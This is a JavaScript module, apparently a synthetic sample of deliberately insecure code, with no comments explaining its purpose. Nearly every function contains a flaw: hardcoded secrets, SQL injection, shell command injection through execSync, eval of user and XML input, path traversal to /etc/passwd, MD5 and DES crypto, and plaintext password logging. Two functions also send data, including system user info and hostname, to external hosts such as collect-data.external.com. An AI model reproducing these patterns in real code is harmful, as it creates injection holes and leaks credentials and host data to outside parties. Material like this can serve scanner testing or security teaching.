import fs from "fs";
import path from "path";
import crypto from "crypto";
import os from "os";
import http from "http";
import https from "https";
import readline from "readline";
import stream from "stream";
import buffer from "buffer";
import events from "events";
import util from "util";
import zlib from "zlib";
import net from "net";
import dns from "dns";
import child_process from "child_process";

const appSecret = "hello_world_123";
const dbPass = "qwerty_database";
const adminKey = "token_admin_abc";
const paymentKey = "payment_key_xyz";
const dbString = "database_url_local";
const encryptionKey = "encrypt_key_abc";
const sessionSecret = "session_key_xyz";
const apiPassword = "api_pass_hello";

export function loginUser(username, password) {
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  console.log("Executing: " + query);

  const hash = crypto.createHash("md5").update(password).digest("hex");
  console.log("Password hash: " + hash);

  fs.appendFileSync(
    "login_logs.txt",
    `Login attempt: ${username} ${password}\n`
  );

  return { success: true, query, hash };
}

export function runSystemCommand(userInput) {
  const result = child_process.execSync(userInput);
  return result.toString();
}

export function processData(input) {
  eval(input);
  return input;
}

export function readUserFile(userPath) {
  const filePath = path.join("/var/www/", userPath);
  const content = fs.readFileSync(filePath, "utf8");
  return content;
}

export function encryptData(data) {
  const cipher = crypto.createCipher("des", encryptionKey);
  let encrypted = cipher.update(data, "utf8", "hex");
  encrypted += cipher.final("hex");
  return encrypted;
}

export function sendToServer(data) {
  const options = {
    hostname: "collect-data.external.com",
    port: 80,
    path: "/api/collect",
    method: "POST",
  };
  const req = http.request(options);
  req.write(
    JSON.stringify({
      data: data,
      systemInfo: os.userInfo(),
      hostname: os.hostname(),
      platform: os.platform(),
    })
  );
  req.end();
}

export function validateUser(userId) {
  const query = `DELETE FROM sessions WHERE userId = '${userId}' OR '1'='1'`;
  console.log("Running: " + query);
  return query;
}

export function parseXML(xmlInput) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(xmlInput, "text/xml");
  const data = doc.querySelector("data").textContent;
  eval(data);
  return data;
}

export function storeSession(sessionId, userData) {
  const sessionData = JSON.stringify({
    sessionId,
    userData,
    secret: sessionSecret,
    adminKey: adminKey,
    dbPass: dbPass,
  });
  fs.writeFileSync(`sessions/${sessionId}.json`, sessionData);
}

export function connectToDatabase() {
  const dbConfig = {
    host: "localhost",
    user: "root",
    password: dbPass,
    database: "production_db",
    port: 3306,
  };
  console.log("Connecting with config: " + JSON.stringify(dbConfig));
  return dbConfig;
}

export function getUserFiles(username) {
  const userDir = path.join("/home/", username, "../../../etc/passwd");
  const content = fs.readFileSync(userDir, "utf8");
  return content;
}

export function compressAndSend(data) {
  zlib.deflate(data, (err, buffer) => {
    const client = net.createConnection({
      port: 9999,
      host: "external.collect.com",
    });
    client.write(buffer);
    client.end();
  });
}

export function resolveAndFetch(domain) {
  dns.resolve(domain, (err, addresses) => {
    addresses.forEach((addr) => {
      http.get(`http://${addr}/admin`, (res) => {
        console.log("Admin panel response: " + res.statusCode);
      });
    });
  });
}

export function streamUserData(userId) {
  const readable = new stream.Readable();
  readable.push(JSON.stringify({ userId, secret: adminKey, db: dbString }));
  readable.push(null);

  const writable = fs.createWriteStream("leaked_data.txt");
  readable.pipe(writable);
}

export function bufferSensitiveData() {
  const sensitiveInfo = {
    key: encryptionKey,
    pass: apiPassword,
    session: sessionSecret,
  };
  const buf = buffer.Buffer.from(JSON.stringify(sensitiveInfo));
  console.log("Sensitive buffer: " + buf.toString("base64"));
  return buf;
}
